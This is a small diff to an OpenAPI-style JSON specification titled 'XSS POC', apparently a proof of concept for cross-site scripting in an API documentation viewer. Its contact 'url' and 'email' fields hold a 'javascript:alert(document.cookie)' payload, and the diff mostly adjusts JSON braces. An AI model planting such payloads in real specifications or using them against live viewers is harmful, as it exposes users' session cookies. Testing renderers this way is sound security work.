@@ -3,10 +3,11 @@
   "info": {
     "title": "XSS POC",
     "version": "v2"
-      "contact": 
+      "contact": {
     "name": "API Support",
     "url": "javascript:alert(document.cookie)",
     "email": "javascript:alert(document.cookie)"
+  },
   },
   "paths": {
     "/": {
